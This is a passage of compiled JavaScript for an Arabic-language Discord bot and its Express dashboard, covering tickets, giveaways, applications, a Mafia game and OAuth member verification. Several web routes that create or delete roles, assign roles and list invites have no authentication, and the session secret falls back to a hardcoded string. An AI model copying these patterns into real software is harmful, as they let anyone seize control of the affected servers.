        await interaction.editReply({ content: `Ticket created: ${channel}` }).catch(console.error);
      } catch (err) {
        console.error("Error creating ticket channel:", err);
        await interaction.editReply({ content: "Failed to create a ticket channel. Please check my permissions." }).catch(console.error);
      }
      return;
    }
    if (interaction.isButton() && interaction.customId === "join_giveaway") {
      const giveaway = db.prepare("SELECT * FROM giveaways WHERE messageId = ? AND status = 'active'").get(interaction.message.id);
      if (!giveaway) return interaction.reply({ content: "\u274C \u0647\u0630\u0647 \u0627\u0644\u0645\u0633\u0627\u0628\u0642\u0629 \u0627\u0646\u062A\u0647\u062A \u0623\u0648 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F\u0629.", ephemeral: true });
      try {
        db.prepare("INSERT INTO giveaway_participants (messageId, userId) VALUES (?, ?)").run(interaction.message.id, interaction.user.id);
        await interaction.reply({ content: "\u2705 \u062A\u0645 \u062A\u0633\u062C\u064A\u0644\u0643 \u0641\u064A \u0627\u0644\u0645\u0633\u0627\u0628\u0642\u0629!", ephemeral: true });
      } catch (e) {
        await interaction.reply({ content: "\u274C \u0623\u0646\u062A \u0645\u0633\u062C\u0644 \u0628\u0627\u0644\u0641\u0639\u0644 \u0641\u064A \u0627\u0644\u0645\u0633\u0627\u0628\u0642\u0629.", ephemeral: true });
      }
      return;
    }
    if (!interaction.isButton()) return;
    if (interaction.customId === "blox_view_logs") {
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) return;
      const logs2 = db.prepare("SELECT * FROM blox_logs ORDER BY id DESC LIMIT 20").all();
      if (logs2.length === 0) return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0633\u062C\u0644\u0627\u062A \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
      const logText = logs2.map((l) => `[ID: ${l.requestId}] ${l.message}`).join("\n");
      const embed = new EmbedBuilder().setTitle("\u{1F4DC} \u0633\u062C\u0644\u0627\u062A \u0627\u0644\u062A\u0644\u0641\u064A\u0644 (Logs)").setDescription(`\`\`\`
${logText.substring(0, 4e3)}
\`\`\``).setColor(5793266);
      return interaction.reply({ embeds: [embed], ephemeral: true });
    }
    if (interaction.customId.startsWith("blox_start_")) {
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) return;
      const requestId = interaction.customId.split("_").pop();
      db.prepare("UPDATE blox_fruits_requests SET status = 'processing' WHERE id = ?").run(requestId);
      db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(requestId, "\u{1F680} \u0628\u062F\u0623 \u0627\u0644\u062A\u0644\u0641\u064A\u0644 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A \u0644\u0644\u062D\u0633\u0627\u0628");
      return interaction.update({ content: `\u2705 \u062A\u0645 \u0628\u062F\u0621 \u0627\u0644\u062A\u0644\u0641\u064A\u0644 \u0644\u0644\u0637\u0644\u0628 #${requestId}.`, embeds: [], components: [] });
    }
    if (interaction.customId.startsWith("blox_complete_") || interaction.customId.startsWith("blox_fail_")) {
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
        return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0641\u0639\u0644 \u0644\u0644\u0645\u0633\u0624\u0648\u0644\u064A\u0646 \u0641\u0642\u0637.", ephemeral: true });
      }
      const isComplete = interaction.customId.startsWith("blox_complete_");
      const requestId = interaction.customId.split("_").pop();
      const newStatus = isComplete ? "completed" : "failed";
      try {
        const request = db.prepare("SELECT * FROM blox_fruits_requests WHERE id = ?").get(requestId);
        if (!request) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0627\u0644\u0637\u0644\u0628.", ephemeral: true });
        db.prepare("UPDATE blox_fruits_requests SET status = ? WHERE id = ?").run(newStatus, requestId);
        const user = await client.users.fetch(request.userId).catch(() => null);
        if (user) {
          const statusMsg = isComplete ? "\u2705 \u062A\u0645 \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621 \u0645\u0646 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643 \u0628\u0646\u062C\u0627\u062D!" : "\u274C \u0646\u0639\u062A\u0630\u0631\u060C \u0641\u0634\u0644\u062A \u0639\u0645\u0644\u064A\u0629 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643. \u064A\u0631\u062C\u0649 \u0627\u0644\u062A\u0648\u0627\u0635\u0644 \u0645\u0639 \u0627\u0644\u0625\u062F\u0627\u0631\u0629.";
          await user.send(statusMsg).catch(() => null);
        }
        await interaction.update({ content: `\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u062D\u0627\u0644\u0629 \u0627\u0644\u0637\u0644\u0628 #${requestId} \u0625\u0644\u0649 **${newStatus}**.`, embeds: [], components: [] });
      } catch (err) {
        console.error("Error updating blox request status:", err);
        await interaction.reply({ content: "\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u062A\u062D\u062F\u064A\u062B \u0627\u0644\u062D\u0627\u0644\u0629.", ephemeral: true });
      }
      return;
    }
    if (interaction.customId === "apply_now") {
      const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId);
      if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0636\u0628\u0637 \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645 \u0644\u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
      const modal = new ModalBuilder().setCustomId("apply_modal").setTitle("\u0646\u0645\u0648\u0630\u062C \u0627\u0644\u062A\u0642\u062F\u064A\u0645");
      const questions = settings.questions ? JSON.parse(settings.questions) : ["\u0627\u0644\u0627\u0633\u0645", "\u0627\u0644\u0639\u0645\u0631", "\u0627\u0644\u062E\u0628\u0631\u0629 \u0627\u0644\u0633\u0627\u0628\u0642\u0629", "\u0644\u0645\u0627\u0630\u0627 \u062A\u0631\u064A\u062F \u0627\u0644\u0627\u0646\u0636\u0645\u0627\u0645\u061F"];
      const rows = questions.map((q, i) => {
        const input = new TextInputBuilder().setCustomId(`q_${i}`).setLabel(q.length > 45 ? q.substring(0, 42) + "..." : q).setStyle(q.length > 20 ? TextInputStyle.Paragraph : TextInputStyle.Short).setRequired(true);
        return new ActionRowBuilder().addComponents(input);
      });
      modal.addComponents(...rows);
      await interaction.showModal(modal);
      return;
    }
    if (interaction.customId.startsWith("accept_app_")) {
      const applicantId = interaction.customId.split("_")[2];
      const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId);
      if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645.", ephemeral: true });
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !(interaction.member?.roles).cache.has(settings.staffRoleId)) {
        return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0644\u0644\u0625\u062F\u0627\u0631\u0629 \u0641\u0642\u0637.", ephemeral: true });
      }
      const member = await interaction.guild?.members.fetch(applicantId).catch(() => null);
      if (member) {
        await member.roles.add(settings.roleId).catch(console.error);
        await member.send(`\u2705 \u062A\u0647\u0627\u0646\u064A\u0646\u0627! \u062A\u0645 \u0642\u0628\u0648\u0644 \u062A\u0642\u062F\u064A\u0645\u0643 \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${interaction.guild?.name}** \u0648\u062A\u0645 \u0645\u0646\u062D\u0643 \u0627\u0644\u0631\u062A\u0628\u0629.`).catch(() => {
        });
      }
      db.prepare("UPDATE applications SET status = 'accepted' WHERE guildId = ? AND userId = ?").run(interaction.guildId, applicantId);
      const embed = EmbedBuilder.from(interaction.message.embeds[0]);
      embed.setColor(65280).setTitle("\u2705 \u062A\u0645 \u0642\u0628\u0648\u0644 \u0627\u0644\u062A\u0642\u062F\u064A\u0645");
      await interaction.update({ embeds: [embed], components: [] });
      return;
    }
    if (interaction.customId.startsWith("reject_app_")) {
      const applicantId = interaction.customId.split("_")[2];
      const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId);
      if (!settings) return interaction.reply({ content: "\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u062A\u0642\u062F\u064A\u0645.", ephemeral: true });
      if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !(interaction.member?.roles).cache.has(settings.staffRoleId)) {
        return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0632\u0631 \u0644\u0644\u0625\u062F\u0627\u0631\u0629 \u0641\u0642\u0637.", ephemeral: true });
      }
      const member = await interaction.guild?.members.fetch(applicantId).catch(() => null);
      if (member) {
        await member.send(`\u274C \u0644\u0644\u0623\u0633\u0641\u060C \u062A\u0645 \u0631\u0641\u0636 \u062A\u0642\u062F\u064A\u0645\u0643 \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${interaction.guild?.name}**.`).catch(() => {
        });
      }
      db.prepare("UPDATE applications SET status = 'rejected' WHERE guildId = ? AND userId = ?").run(interaction.guildId, applicantId);
      const embed = EmbedBuilder.from(interaction.message.embeds[0]);
      embed.setColor(16711680).setTitle("\u274C \u062A\u0645 \u0631\u0641\u0636 \u0627\u0644\u062A\u0642\u062F\u064A\u0645");
      await interaction.update({ embeds: [embed], components: [] });
      return;
    }
    if (interaction.customId === "mafia_join") {
      const game = mafiaGames.get(interaction.guildId || "");
      if (!game || game.phase !== "join") return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u0641\u062A\u0631\u0629 \u0627\u0646\u0636\u0645\u0627\u0645 \u062D\u0627\u0644\u064A\u0627\u064B.", ephemeral: true });
      if (game.players.find((p) => p.id === interaction.user.id)) {
        return interaction.reply({ content: "\u274C \u0623\u0646\u062A \u0645\u0646\u0636\u0645 \u0628\u0627\u0644\u0641\u0639\u0644.", ephemeral: true });
      }
      await interaction.deferUpdate().catch(() => {
      });
      game.players.push({
        id: interaction.user.id,
        tag: interaction.user.tag,
        role: "citizen",
        isAlive: true
      });
      const embed = EmbedBuilder.from(interaction.message.embeds[0]);
      embed.setDescription(`\u0627\u0644\u0644\u0627\u0639\u0628\u0648\u0646 \u0627\u0644\u0645\u0646\u0636\u0645\u0648\u0646 (${game.players.length}):
${game.players.map((p) => `- ${p.tag}`).join("\n")}`);
      await interaction.editReply({ embeds: [embed] });
      return;
    }
    if (interaction.customId === "mafia_start_game") {
      const game = mafiaGames.get(interaction.guildId || "");
      if (!game || game.phase !== "join") return interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0628\u062F\u0621 \u0627\u0644\u0644\u0639\u0628\u0629 \u0627\u0644\u0622\u0646.", ephemeral: true });
      if (game.players.length < 4) {
        return interaction.reply({ content: "\u274C \u0646\u062D\u062A\u0627\u062C \u0625\u0644\u0649 4 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644 \u0644\u0644\u0628\u062F\u0621.", ephemeral: true });
      }
      await interaction.deferUpdate().catch(() => {
      });
      const players = [...game.players];
      const mafiaIdx = Math.floor(Math.random() * players.length);
      players[mafiaIdx].role = "mafia";
      let doctorIdx;
      do {
        doctorIdx = Math.floor(Math.random() * players.length);
      } while (doctorIdx === mafiaIdx);
      players[doctorIdx].role = "doctor";
      let detectiveIdx;
      do {
        detectiveIdx = Math.floor(Math.random() * players.length);
      } while (detectiveIdx === mafiaIdx || detectiveIdx === doctorIdx);
      players[detectiveIdx].role = "detective";
      game.phase = "night";
      const roleRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId("mafia_show_role").setLabel("\u0643\u0634\u0641 \u0647\u0648\u064A\u062A\u064A").setStyle(ButtonStyle.Primary)
      );
      await interaction.editReply({
        content: "\u{1F3AD} \u0628\u062F\u0623\u062A \u0627\u0644\u0644\u0639\u0628\u0629! \u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0645\u0639\u0631\u0641\u0629 \u0647\u0648\u064A\u062A\u0643.",
        embeds: [],
        components: [roleRow]
      });
      setTimeout(() => {
        startNightPhase(game);
      }, 5e3);
      return;
    }
    if (interaction.customId === "close_ticket") {
      const channel = interaction.channel;
      if (!channel || channel.type !== ChannelType.GuildText) return;
      if (!interaction.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return interaction.reply({ content: "I don't have permission to delete this channel!", ephemeral: true }).catch(console.error);
      }
      try {
        db.prepare("UPDATE tickets SET status = 'closed' WHERE channelId = ?").run(channel.id);
        await interaction.reply("Closing ticket in 5 seconds...").catch(console.error);
        setTimeout(() => channel.delete().catch(console.error), 5e3);
      } catch (err) {
        console.error("Error closing ticket:", err);
      }
    }
    if (interaction.customId === "claim_ticket") {
      const channel = interaction.channel;
      if (!channel || channel.type !== ChannelType.GuildText) return;
      await interaction.deferUpdate().catch(() => {
      });
      try {
        const ticket = db.prepare("SELECT * FROM tickets WHERE channelId = ?").get(channel.id);
        if (!ticket) return interaction.editReply({ content: "Ticket not found in database." });
        if (ticket.staffId) {
          return interaction.editReply({ content: `This ticket has already been claimed by <@${ticket.staffId}>.` });
        }
        const categoryRole = db.prepare("SELECT roleId FROM ticket_categories WHERE guildId = ? AND categoryName = ?").get(interaction.guildId, ticket.category);
        const isStaff = interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) || categoryRole && (interaction.member?.roles).cache.has(categoryRole.roleId);
        if (!isStaff) {
          return interaction.editReply({ content: "You do not have permission to claim this ticket." });
        }
        db.prepare("UPDATE tickets SET staffId = ? WHERE channelId = ?").run(interaction.user.id, channel.id);
        const embed = EmbedBuilder.from(interaction.message.embeds[0]);
        embed.addFields({ name: "Claimed By", value: `${interaction.user}`, inline: true });
        const row = ActionRowBuilder.from(interaction.message.components[0]);
        row.components[0].setDisabled(true).setLabel("Claimed");
        await interaction.editReply({ embeds: [embed], components: [row] });
        await channel.send(`\u2705 Ticket claimed by ${interaction.user}.`);
      } catch (err) {
        console.error("Error claiming ticket:", err);
        await interaction.editReply({ content: "Failed to claim ticket." });
      }
      return;
    }
    if (interaction.customId === "verify_member") {
      if (interaction.guildId === "1254568460764053566") {
        return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u062A\u062D\u0642\u0642 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
      }
      let appUrl = APP_URL || "";
      appUrl = appUrl.replace(/\/$/, "");
      const REDIRECT_URI = `${appUrl}/api/auth/callback`;
      const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${interaction.guildId}`;
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setLabel("\u0627\u0636\u063A\u0637 \u0647\u0646\u0627 \u0644\u0644\u062A\u062D\u0642\u0642").setURL(OAUTH_URL).setStyle(ButtonStyle.Link)
      );
      await interaction.reply({ content: "\u064A\u0631\u062C\u0649 \u0627\u0644\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0631\u0627\u0628\u0637 \u0623\u062F\u0646\u0627\u0647 \u0644\u0644\u062A\u062D\u0642\u0642 \u0645\u0646 \u062D\u0633\u0627\u0628\u0643:", components: [row], ephemeral: true });
    }
  } catch (err) {
    const interactionId = interaction.customId || interaction.commandName || "unknown";
    console.error(`Global interaction error [${interaction.type}] (${interactionId}):`, err);
    try {
      if (interaction.isRepliable()) {
        if (interaction.deferred || interaction.replied) {
          await interaction.editReply({ content: "An error occurred while processing this interaction." }).catch(() => {
          });
        } else {
          await interaction.reply({ content: "An error occurred while processing this interaction.", ephemeral: true }).catch(() => {
          });
        }
      }
    } catch (innerErr) {
      console.error("Failed to send error reply:", innerErr);
    }
  }
});
async function refreshAccessToken(refreshToken) {
  try {
    const response = await axios.post("https://discord.com/api/oauth2/token", new URLSearchParams({
      client_id: DISCORD_CLIENT_ID,
      client_secret: DISCORD_CLIENT_SECRET,
      grant_type: "refresh_token",
      refresh_token: refreshToken
    }), {
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });
    return response.data;
  } catch (err) {
    console.error("Failed to refresh access token:", err);
    return null;
  }
}
async function startServer() {
  console.log("Starting server initialization...");
  const app = express();
  const PORT = process.env.PORT || 3e3;
  app.use(express.json());
  app.use(cookieParser());
  app.set("trust proxy", 1);
  console.log("Setting up session store...");
  const SqliteStore = SQLiteStore(session);
  const sessionStore = new SqliteStore({
    client: db,
    expired: {
      clear: true,
      intervalMs: 9e5
      // 15 minutes
    }
  });
  app.use(session({
    store: sessionStore,
    secret: JWT_SECRET || "requiem-persistent-secret-key-99",
    resave: false,
    saveUninitialized: false,
    proxy: true,
    cookie: {
      secure: true,
      sameSite: "none",
      maxAge: 30 * 24 * 60 * 60 * 1e3
      // 30 days
    }
  }));
  console.log("Defining API routes...");
  app.get("/api/status", (req, res) => {
    try {
      res.json({
        status: client.isReady() ? "online" : "offline",
        guilds: client.guilds.cache.size,
        users: client.users.cache.size,
        uptime: client.uptime || 0,
        tag: client.user?.tag || "Bot Offline"
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch status" });
    }
  });
  app.get("/api/ping", (req, res) => {
    res.json({ status: "pong", timestamp: Date.now() });
  });
  app.get("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const roles = guild.roles.cache.map((r) => ({
        id: r.id,
        name: r.name,
        color: r.hexColor,
        position: r.position,
        permissions: r.permissions.toArray(),
        managed: r.managed
      }));
      res.json(roles);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch roles" });
    }
  });
  app.post("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const { name, color, permissions } = req.body;
      const role = await guild.roles.create({
        name: name || "New Role",
        color: color || "#99AAB5",
        permissions: permissions || []
      });
      res.json({
        id: role.id,
        name: role.name,
        color: role.hexColor,
        position: role.position,
        permissions: role.permissions.toArray(),
        managed: role.managed
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to create role" });
    }
  });
  app.patch("/api/guilds/:guildId/roles/:roleId", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const role = await guild.roles.fetch(req.params.roleId);
      if (!role) return res.status(404).json({ error: "Role not found" });
      const { name, color, permissions } = req.body;
      await role.edit({ name, color, permissions });
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update role" });
    }
  });
  app.delete("/api/guilds/:guildId/roles/:roleId", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const role = await guild.roles.fetch(req.params.roleId);
      if (!role) return res.status(404).json({ error: "Role not found" });
      await role.delete();
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete role" });
    }
  });
  app.get("/api/stats", (req, res) => {
    try {
      const totalMessages = db.prepare("SELECT COUNT(DISTINCT userId) as count FROM leveling").get();
      const topLevels = db.prepare("SELECT userId, MAX(level) as level, SUM(xp) as xp FROM leveling GROUP BY userId ORDER BY level DESC, xp DESC LIMIT 5").all();
      const openTickets = db.prepare("SELECT COUNT(*) as count FROM tickets WHERE status = 'open'").get();
      res.json({
        totalUsers: totalMessages?.count || 0,
        topLevels: topLevels || [],
        openTickets: openTickets?.count || 0
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch stats" });
    }
  });
  app.get("/api/guilds/:guildId/stats", (req, res) => {
    try {
      const { guildId } = req.params;
      const totalUsers = db.prepare("SELECT COUNT(DISTINCT userId) as count FROM leveling WHERE guildId = ?").get(guildId);
      const topLevels = db.prepare("SELECT userId, level, xp FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC LIMIT 5").all(guildId);
      const openTickets = db.prepare("SELECT COUNT(*) as count FROM tickets WHERE guildId = ? AND status = 'open'").get(guildId);
      res.json({
        totalUsers: totalUsers?.count || 0,
        topLevels: topLevels || [],
        openTickets: openTickets?.count || 0
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch guild stats" });
    }
  });
  app.get("/api/guilds", async (req, res) => {
    try {
      if (!client.isReady()) return res.json([]);
      const guilds = await Promise.all(client.guilds.cache.map(async (guild) => {
        let inviteUrl = null;
        try {
          const invites = await guild.invites.fetch();
          const invite = invites.first();
          if (invite) {
            inviteUrl = invite.url;
          } else {
            const channel = guild.channels.cache.find((c) => c.type === ChannelType.GuildText);
            if (channel && channel.permissionsFor(guild.members.me).has(PermissionFlagsBits.CreateInstantInvite)) {
              const newInvite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
              inviteUrl = newInvite.url;
            }
          }
        } catch (e) {
        }
        return {
          id: guild.id,
          name: guild.name,
          icon: guild.iconURL(),
          memberCount: guild.memberCount,
          invite: inviteUrl
        };
      }));
      res.json(guilds);
    } catch (err) {
      console.error("Failed to fetch guilds:", err);
      res.status(500).json({ error: "Failed to fetch guilds" });
    }
  });
  app.get("/api/guilds/:guildId/channels", async (req, res) => {
    try {
      const { guildId } = req.params;
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const channels = guild.channels.cache.filter((c) => c.type === ChannelType.GuildText).map((c) => ({ id: c.id, name: c.name }));
      res.json(channels);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch channels" });
    }
  });
  app.get("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const { guildId } = req.params;
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const roles = guild.roles.cache.filter((r) => r.name !== "@everyone" && !r.managed).map((r) => ({ id: r.id, name: r.name, color: r.hexColor }));
      res.json(roles);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch roles" });
    }
  });
  app.get("/api/guilds/:guildId/welcome", (req, res) => {
    try {
      const { guildId } = req.params;
      let welcome = db.prepare("SELECT * FROM welcome_settings WHERE guildId = ?").get(guildId);
      if (!welcome) {
        welcome = { guildId, channelId: null, message: "Welcome {user} to {server}!", imageEnabled: 1, dmEnabled: 0, dmMessage: "Welcome to {server}!" };
        db.prepare("INSERT INTO welcome_settings (guildId, channelId, message, imageEnabled, dmEnabled, dmMessage) VALUES (?, ?, ?, ?, ?, ?)").run(guildId, null, welcome.message, 1, 0, welcome.dmMessage);
      }
      res.json(welcome);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch welcome settings" });
    }
  });
  app.post("/api/guilds/:guildId/welcome", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { channelId, message, imageEnabled, dmEnabled, dmMessage } = req.body;
      db.prepare("INSERT OR REPLACE INTO welcome_settings (guildId, channelId, message, imageEnabled, dmEnabled, dmMessage) VALUES (?, ?, ?, ?, ?, ?)").run(guildId, channelId, message, imageEnabled ? 1 : 0, dmEnabled ? 1 : 0, dmMessage);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update welcome settings" });
    }
  });
  app.get("/api/guilds/:guildId/auto-roles", (req, res) => {
    try {
      const { guildId } = req.params;
      const roles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guildId);
      res.json(roles.map((r) => r.roleId));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch auto-roles" });
    }
  });
  app.post("/api/guilds/:guildId/auto-roles", express.json(), async (req, res) => {
    try {
      const { guildId } = req.params;
      const { roleIds } = req.body;
      db.prepare("DELETE FROM auto_roles WHERE guildId = ?").run(guildId);
      const insert = db.prepare("INSERT INTO auto_roles (guildId, roleId) VALUES (?, ?)");
      for (const roleId of roleIds) {
        insert.run(guildId, roleId);
      }
      const guild = client.guilds.cache.get(guildId);
      if (guild) {
        guild.members.fetch().then((members) => {
          members.forEach((member) => {
            for (const roleId of roleIds) {
              if (!member.roles.cache.has(roleId)) {
                member.roles.add(roleId).catch(() => {
                });
              }
            }
          });
        }).catch((err) => console.error("Failed to fetch members for auto-role update:", err));
      }
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update auto-roles" });
    }
  });
  app.get("/api/guilds/:guildId/badwords", (req, res) => {
    try {
      const { guildId } = req.params;
      const words = db.prepare("SELECT word FROM badwords WHERE guildId = ?").all(guildId);
      res.json(words.map((w) => w.word));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch badwords" });
    }
  });
  app.post("/api/guilds/:guildId/badwords", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { words } = req.body;
      db.prepare("DELETE FROM badwords WHERE guildId = ?").run(guildId);
      const insert = db.prepare("INSERT INTO badwords (guildId, word) VALUES (?, ?)");
      for (const word of words) {
        insert.run(guildId, word);
      }
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update badwords" });
    }
  });
  app.get("/api/guilds/:guildId/aliases", (req, res) => {
    try {
      const { guildId } = req.params;
      const aliases = db.prepare("SELECT * FROM aliases WHERE guildId = ?").all(guildId);
      res.json(aliases);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch aliases" });
    }
  });
  app.post("/api/guilds/:guildId/aliases", express.json(), async (req, res) => {
    try {
      const { guildId } = req.params;
      const { aliasName, originalCommand } = req.body;
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const globalCommands = await client.application?.commands.fetch();
      const original = globalCommands?.find((c) => c.name === originalCommand);
      if (!original) return res.status(400).json({ error: "Original command not found" });
      await guild.commands.create({
        name: aliasName,
        description: `Shortcut for /${originalCommand}`,
        options: original.options
      });
      db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)").run(guildId, aliasName, originalCommand);
      res.json({ success: true });
    } catch (err) {
      console.error("Failed to create alias:", err);
      res.status(500).json({ error: "Failed to create alias" });
    }
  });
  app.delete("/api/guilds/:guildId/aliases/:aliasName", async (req, res) => {
    try {
      const { guildId, aliasName } = req.params;
      const guild = client.guilds.cache.get(guildId);
      if (guild) {
        const commands = await guild.commands.fetch();
        const cmd = commands.find((c) => c.name === aliasName);
        if (cmd) await cmd.delete();
      }
      db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete alias" });
    }
  });
  app.get("/api/logs", (req, res) => {
    res.json({ logs });
  });
  app.use((req, res, next) => {
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith("Bearer ")) {
      const token = authHeader.substring(7);
      try {
        const decoded = jwt.verify(token, JWT_SECRET);
        req.user = decoded;
      } catch (err) {
        console.error("JWT Verification Error:", err.message);
      }
    }
    next();
  });
  app.get("/api/guilds/:guildId/protection", (req, res) => {
    const { guildId } = req.params;
    const settings = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId) || {
      guildId,
      antiLink: 0,
      antiSpam: 0,
      antiRaid: 0,
      antiBot: 0,
      antiChannelControl: 0,
      logChannel: null
    };
    res.json(settings);
  });
  app.get("/api/guilds/:guildId/whitelisted-bots", (req, res) => {
    const { guildId } = req.params;
    const bots = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ?").all(guildId);
    res.json(bots);
  });
  app.post("/api/guilds/:guildId/whitelisted-bots", (req, res) => {
    const { guildId } = req.params;
    const { botId } = req.body;
    db.prepare("INSERT OR IGNORE INTO whitelisted_bots (guildId, botId) VALUES (?, ?)").run(guildId, botId);
    res.json({ status: "ok" });
  });
  app.delete("/api/guilds/:guildId/whitelisted-bots/:botId", (req, res) => {
    const { guildId, botId } = req.params;
    db.prepare("DELETE FROM whitelisted_bots WHERE guildId = ? AND botId = ?").run(guildId, botId);
    res.json({ status: "ok" });
  });
  app.get("/api/guilds/:guildId/backups", (req, res) => {
    const { guildId } = req.params;
    const backups = db.prepare("SELECT * FROM backups WHERE guildId = ? ORDER BY createdAt DESC").all(guildId);
    res.json(backups);
  });
  app.post("/api/guilds/:guildId/backups", async (req, res) => {
    const { guildId } = req.params;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).json({ error: "Guild not found" });
    try {
      const roles = guild.roles.cache.filter((r) => !r.managed && r.id !== guild.id).map((r) => ({
        name: r.name,
        color: r.color,
        hoist: r.hoist,
        permissions: r.permissions.bitfield.toString(),
        mentionable: r.mentionable,
        position: r.position
      }));
      const channels = guild.channels.cache.map((c) => ({
        name: c.name,
        type: c.type,
        parentId: c.parentId,
        topic: c.topic || null,
        nsfw: c.nsfw || false,
        rateLimitPerUser: c.rateLimitPerUser || 0,
